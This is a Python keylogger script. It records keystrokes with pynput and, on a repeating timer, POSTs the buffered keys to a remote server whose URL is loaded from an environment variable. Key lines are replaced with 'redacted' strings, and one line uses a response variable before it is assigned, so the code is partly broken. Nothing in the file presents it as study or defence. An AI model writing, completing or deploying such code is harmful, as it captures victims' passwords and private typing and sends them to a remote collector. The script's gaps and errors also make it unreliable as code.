
from pynput import keyboard
import requests
import threading
import datetime
import os
from dotenv import load_dotenv

load_dotenv()

SERVER_URL = os.getenv("-----redactedddd-------------")  
SEND_INTERVAL = 10

     
LOCK = threading.Lock()
LOG_BUFFER=[]

def send_buffer():
    
    global SEND_INTERVAL
    global LOG_BUFFER
    with LOCK:
        if LOG_BUFFER:
            try:
                SEND_INTERVAL=int(res.json()["interval"])
            except:
                pass
            payload = {
                "timestamp": "------redacteddd----------",
                "data": "------redactedddd-------------"
            }
            try:
                res=requests.post(SERVER_URL, json=payload)
                
                if res:
                    LOG_BUFFER.clear()
            except:
              pass
                
    threading.Timer(SEND_INTERVAL, send_buffer).start()


def on_press(key):
    k=""
    if key == keyboard.Key.space:
        k=" "
    elif key == keyboard.Key.backspace:
       try: "-----redacteddd--------"
       except:
           pass
    elif key == keyboard.Key.left or key == keyboard.Key.right or key == keyboard.Key.up or key == keyboard.Key.down:
        k=""
    else:
        try:
            k = key.char
        except AttributeError:
            k = str(key)

    with LOCK:
        if k!="-----redactedddd---------":
            "---------redactedddd---------"

send_buffer()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()



